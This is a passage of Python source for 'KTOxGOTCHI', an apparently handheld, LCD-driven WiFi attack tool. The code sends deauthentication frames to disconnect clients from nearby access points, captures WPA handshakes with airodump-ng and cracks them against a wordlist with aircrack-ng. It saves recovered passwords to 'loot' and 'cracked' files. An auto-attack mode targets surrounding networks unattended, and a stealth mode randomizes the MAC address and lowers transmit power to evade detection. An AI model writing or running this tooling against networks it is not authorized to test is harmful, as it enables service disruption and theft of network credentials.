                    subprocess.run(f"rm -f {tmp_hs}*", shell=True)
                    proc = subprocess.Popen(
                        f"airodump-ng -c {ch} --bssid {bssid} -w {tmp_hs} {mon_iface}",
                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    time.sleep(2)
                    client = random.choice(clients)
                    subprocess.run(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {mon_iface}",
                                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(3)
                    proc.terminate()
                    time.sleep(1)
                    cap_file = f"{tmp_hs}-01.cap"
                    if os.path.exists(cap_file):
                        aircrack_out = subprocess.run(f"aircrack-ng {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
                        if "handshake" in aircrack_out.lower():
                            # Save handshake
                            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                            safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
                            dest = os.path.join(HANDSHAKE_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
                            subprocess.run(f"cp {cap_file} {dest}", shell=True)
                            with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
                                log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
                            session_handshakes += 1
                            lifetime_handshakes += 1
                            save_stats()
                            set_mood("happy")
                            # Crack
                            if os.path.exists(WORDLIST):
                                crack_result = subprocess.run(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
                                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
                                if key_match:
                                    password = key_match.group(1)
                                    cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
                                    with open(cracked_file, "w") as cf:
                                        cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
                                    cracked_count += 1
                                    save_stats()
                                    set_mood("cracked")
                            attacked = True
                            time.sleep(8)
                            break
                if attacked:
                    break
            if not attacked:
                time.sleep(5)
        except Exception as e:
            print(f"Auto-attack error: {e}")
            time.sleep(3)

# ----------------------------------------------------------------------
# LCD drawing (face, stats, captures, manual target list, settings)
# ----------------------------------------------------------------------
_blink = False
_next_blink = time.time() + random.uniform(5,10)

def draw_face():
    global _blink, _next_blink, capture_flash
    now = time.time()
    if _blink:
        if now > _next_blink + 0.2:
            _blink = False
            _next_blink = now + random.uniform(5, 10)
    else:
        if now >= _next_blink:
            _blink = True

    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)

    # Compact header bar
    d.rectangle((0, 0, W, 13), fill=(139, 0, 0))
    d.text((3, 2), "KTOxGOTCHI", font=f9, fill=(231, 76, 60))
    dot_col = (30, 132, 73) if capture_event.is_set() else (100, 100, 100)
    d.ellipse((W - 11, 3, W - 4, 10), fill=dot_col)

    # Stats row (compact, just below header)
    with lock:
        aps = len(session_aps)
        cli = len(session_clients)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        last = last_capture_ssid
    total_pwnd = hs + hhs + pm
    lt_total = lifetime_handshakes + lifetime_half_hs + lifetime_pmkid
    d.text((2, 14), f"AP:{aps} CLI:{cli}  PWND:{total_pwnd} LT:{lt_total}", font=f9, fill=(171, 178, 185))

    # Large face — dominant visual element
    face_char = faces["blink"] if _blink and mood == "normal" else faces.get(mood, faces["normal"])
    face_color = "#00FF00" if capture_event.is_set() else "#666666"
    if capture_flash > 0:
        face_color = "#FFFF00"
        capture_flash -= 1
    if stealth_enabled:
        face_color = "#8800FF"
    try:
        face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 20)
    except:
        face_font = f14
    bbox = d.textbbox((0, 0), face_char, font=face_font)
    fw = bbox[2] - bbox[0]
    fh = bbox[3] - bbox[1]
    face_area_top = 26
    face_area_bot = H - 40   # leave room for 3 bottom lines without overlap
    fx = max(0, (W - fw) // 2)
    fy = face_area_top + (face_area_bot - face_area_top - fh) // 2
    d.text((fx, fy), face_char, font=face_font, fill=face_color)

    # Bottom info — no filled rectangle so nothing gets covered
    if last:
        d.text((2, H - 30), f">{last[:22]}", font=f9, fill=(30, 132, 73))
    elapsed = int(time.time() - start_time)
    mode_ch = f"{'A' if auto_attack else 'M'} ch{current_channel}"
    uptime = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
    d.text((2, H - 20), f"{mode_ch}  {uptime}", font=f9, fill=(113, 125, 126))
    d.text((2, H - 10), "K1=View K2=Menu K3=Exit", font=f9, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)

def draw_stats():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4,3), "STATS", font=f9, fill=(231, 76, 60))
    y = 20
    with lock:
        d.text((4, y), f"Full HS: {session_handshakes}", font=f9, fill=(171, 178, 185)); y += 12
        d.text((4, y), f"Half HS: {session_half_hs}", font=f9, fill=(171, 178, 185)); y += 12
        d.text((4, y), f"PMKID: {session_pmkid}", font=f9, fill=(171, 178, 185)); y += 12
        d.text((4, y), f"Deauths: {session_deauths}", font=f9, fill=(171, 178, 185)); y += 12
        d.text((4, y), f"Peers: {len(peers_detected)}", font=f9, fill=(171, 178, 185)); y += 12
    d.text((4, H-30), "Lifetime totals:", font=f9, fill=(171, 178, 185)); y = H-20
    d.text((4, y), f"HS:{lifetime_handshakes} H:{lifetime_half_hs} P:{lifetime_pmkid}", font=f9, fill=(113, 125, 126))
    d.text((4, H-10), "K1=Back K3=Exit", font=f9, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)

def draw_captures(scroll):
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4,3), "CAPTURES", font=f9, fill=(231, 76, 60))
    files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".cap")]
    files.sort(reverse=True)
    if files:
        visible = files[scroll:scroll+6]
        y = 20
        for fname in visible:
            d.text((4, y), fname[:20], font=f9, fill=(171, 178, 185))
            y += 12
        d.text((4, H-30), f"{len(files)} total", font=f9, fill=(171, 178, 185))
    else:
        d.text((4, 40), "No captures yet", font=f9, fill=(113, 125, 126))
    d.text((4, H-10), "U/D:Scroll K1:Back K3:Exit", font=f9, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)

def draw_target_list():
    global networks, selected_idx
    if not networks:
        draw_face()
        return
    net = networks[selected_idx]
    lines = [
        f"Target: {net['essid'][:16]}",
        f"BSSID: {net['bssid']}",
        f"Channel: {net['channel']}",
        f"Selected: {selected_idx+1}/{len(networks)}",
        "",
        "UP/DN OK to attack K3=back"
    ]
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4, 3), "SELECT TARGET", font=f9, fill=(231, 76, 60))
    y = 20
    for line in lines:
        d.text((4, y), line[:23], font=f9, fill=(171, 178, 185))
        y += 12
    d.text((4, H-10), "UP/DN OK K3=Back", font=f9, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)

def draw_settings():
    global settings_idx, deauth_enabled, stealth_enabled, auto_attack
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4, 3), "SETTINGS", font=f9, fill=(231, 76, 60))
    y = 20
    for i, opt in enumerate(settings_options):
        prefix = "> " if i == settings_idx else "  "
        if opt == "Stealth Mode":
            status = "ON" if stealth_enabled else "OFF"
            line = f"{prefix}{opt}: {status}"
        elif opt == "Deauth":
            status = "ON" if deauth_enabled else "OFF"
            line = f"{prefix}{opt}: {status}"
        elif opt == "Auto Attack":
            status = "ON" if auto_attack else "OFF"
            line = f"{prefix}{opt}: {status}"
        else:
            line = f"{prefix}{opt}"
        d.text((4, y), line[:22], font=f9, fill=(171, 178, 185) if i == settings_idx else "#AAAAAA")
        y += 12
    d.text((4, H-10), "U/D OK K3=Back", font=f9, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    global mon_iface, original_mac, view, scroll, networks, selected_idx
    global auto_attack, auto_attack_stop, deauth_enabled, stealth_enabled, capture_flash, settings_idx
    global capture_event

    if not SCAPY_OK:
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "scapy not installed", font=f9, fill="red")
        d.text((4, 55), "sudo pip install scapy", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        return

    load_stats()
    load_config()
    iface = select_interface()
    if not iface:
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "No WiFi interface", font=f9, fill="red")
        d.text((4, 55), "Check adapter", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        return
    original_mac = get_mac(iface)

    # Enable monitor mode
    img = Image.new("RGB", (W, H), "black")
    d = ImageDraw.Draw(img)
    d.text((4, 50), f"Monitor: {iface}...", font=f9, fill="#FFAA00")
    LCD.LCD_ShowImage(img, 0, 0)
    mon_iface = monitor_up(iface)
    if not mon_iface:
        d.text((4, 60), "FAILED", font=f9, fill="red")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        return

    # Start capturing immediately — without this, channel_hopper and
    # packet_handler both exit/skip immediately since they gate on this event.
    capture_event.set()

    # Start background threads
    threading.Thread(target=sniffer_thread, daemon=True).start()
    threading.Thread(target=half_hs_checker, daemon=True).start()
    threading.Thread(target=channel_hopper, daemon=True).start()

    # Initial scan in background so the LCD stays responsive during startup
    threading.Thread(target=lambda: scan_networks_quick(10), daemon=True).start()

    view = "face"
    scroll = 0
    state = "main"  # main, target_select, settings

    # Apply stealth if enabled from config
    if stealth_enabled and mon_iface:
        randomize_mac(mon_iface)
        reduce_tx_power(mon_iface)

    # Start auto-attack if enabled
    if auto_attack:
        auto_attack_stop.clear()
        threading.Thread(target=auto_attack_worker, daemon=True).start()

    while not shutdown.is_set():
        btn = wait_btn(0.2)
        if state == "main":
            if view == "face":
                draw_face()
            elif view == "stats":
                draw_stats()
            elif view == "captures":
                draw_captures(scroll)

            if btn == "KEY3":
                break
            elif btn == "KEY1":
                if view == "face":
                    view = "stats"
                elif view == "stats":
                    view = "captures"
                else:
                    view = "face"
                scroll = 0
                time.sleep(0.3)
            elif btn == "KEY2":
                state = "settings"
                settings_idx = 0
                draw_settings()
                time.sleep(0.3)
            elif btn == "LEFT" and view == "face":
                deauth_enabled = not deauth_enabled
                save_config()
                time.sleep(0.3)
            elif btn == "RIGHT" and view == "face":
                stealth_enabled = not stealth_enabled
                if stealth_enabled and mon_iface:
                    randomize_mac(mon_iface)
                    reduce_tx_power(mon_iface)
                elif not stealth_enabled and mon_iface:
                    restore_mac(mon_iface, original_mac)
                    restore_tx_power(mon_iface)
                save_config()
                time.sleep(0.3)
            elif btn == "UP" and view == "captures":
                scroll = max(0, scroll-1)
            elif btn == "DOWN" and view == "captures":
                scroll += 1
            elif btn == "OK":
                if not auto_attack:
                    state = "target_select"
                    scan_networks_quick(10)
                    selected_idx = 0
                    draw_target_list()
        elif state == "target_select":
            draw_target_list()
            if btn == "KEY3":
                state = "main"
            elif btn == "UP" and networks:
                selected_idx = (selected_idx - 1) % len(networks)
                draw_target_list()
            elif btn == "DOWN" and networks:
                selected_idx = (selected_idx + 1) % len(networks)
                draw_target_list()
            elif btn == "OK" and networks:
                target = networks[selected_idx]
                # Single attack
                set_mood("assoc")
                ch = int(target["channel"])
                bssid = target["bssid"]
                essid = target["essid"]
                # Get clients
                tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
                subprocess.run(f"rm -f {tmp}*", shell=True)
                subprocess.run(
                    f"timeout 6 airodump-ng -c {ch} --bssid {bssid} -w {tmp} {mon_iface}",
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                time.sleep(1)
                clients = []
                csv_file = f"{tmp}-01.csv"
                if os.path.exists(csv_file):
                    with open(csv_file, errors="ignore") as f:
                        content = f.read()
                    if "Station MAC" in content:
                        station_section = content.split("Station MAC")[1]
                        for line in station_section.strip().split("\n"):
                            parts = [p.strip() for p in line.split(",")]
                            if parts and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                                clients.append(parts[0])
                if clients:
                    client = random.choice(clients)
                    tmp_hs = f"/tmp/ktoxgotchi_manual_{bssid.replace(':', '_')}"
                    subprocess.run(f"rm -f {tmp_hs}*", shell=True)
                    proc = subprocess.Popen(
                        f"airodump-ng -c {ch} --bssid {bssid} -w {tmp_hs} {mon_iface}",
                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    time.sleep(2)
                    subprocess.run(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {mon_iface}",
                                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(3)
                    proc.terminate()
                    time.sleep(1)
                    cap_file = f"{tmp_hs}-01.cap"
                    if os.path.exists(cap_file):
                        aircrack_out = subprocess.run(f"aircrack-ng {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
                        if "handshake" in aircrack_out.lower():
                            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                            safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
                            dest = os.path.join(HANDSHAKE_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
                            subprocess.run(f"cp {cap_file} {dest}", shell=True)
                            with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
                                log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
                            session_handshakes += 1
                            lifetime_handshakes += 1
                            save_stats()
                            set_mood("happy")
                            if os.path.exists(WORDLIST):
                                crack_result = subprocess.run(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
                                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
                                if key_match:
                                    password = key_match.group(1)
                                    cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
                                    with open(cracked_file, "w") as cf:
                                        cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
                                    cracked_count += 1
                                    save_stats()
                                    set_mood("cracked")
                state = "main"
                time.sleep(2)
        elif state == "settings":
            draw_settings()
            if btn == "KEY3":
                state = "main"
                save_config()
                # If auto_attack changed, start/stop worker
                if auto_attack:
                    if auto_attack_stop.is_set():
                        auto_attack_stop.clear()
                        threading.Thread(target=auto_attack_worker, daemon=True).start()
                else:
                    auto_attack_stop.set()
                # Apply stealth changes immediately
                if stealth_enabled and mon_iface:
                    randomize_mac(mon_iface)
                    reduce_tx_power(mon_iface)
                elif not stealth_enabled and mon_iface:
                    restore_mac(mon_iface, original_mac)
                    restore_tx_power(mon_iface)
                time.sleep(0.3)
            elif btn == "UP":
                settings_idx = (settings_idx - 1) % len(settings_options)
            elif btn == "DOWN":
                settings_idx = (settings_idx + 1) % len(settings_options)
            elif btn == "OK":
                opt = settings_options[settings_idx]
                if opt == "Crack Handshakes":
                    manual_crack()
                elif opt == "Stealth Mode":
                    stealth_enabled = not stealth_enabled
                elif opt == "Deauth":
                    deauth_enabled = not deauth_enabled
                elif opt == "Auto Attack":
                    auto_attack = not auto_attack
                elif opt == "Whitelist":
                    show_whitelist()
                elif opt == "Reset Stats":
                    reset_stats()
                draw_settings()
                time.sleep(0.3)
        time.sleep(0.05)

    # Cleanup
    shutdown.set()
    capture_event.clear()
    auto_attack_stop.set()
    save_stats()
    save_config()
    if stealth_enabled and mon_iface:
        restore_mac(mon_iface, original_mac)
        restore_tx_power(mon_iface)
    time.sleep(0.5)
    monitor_down(mon_iface)
    LCD.LCD_Clear()
    GPIO.cleanup()

if __name__ == "__main__":
    main()
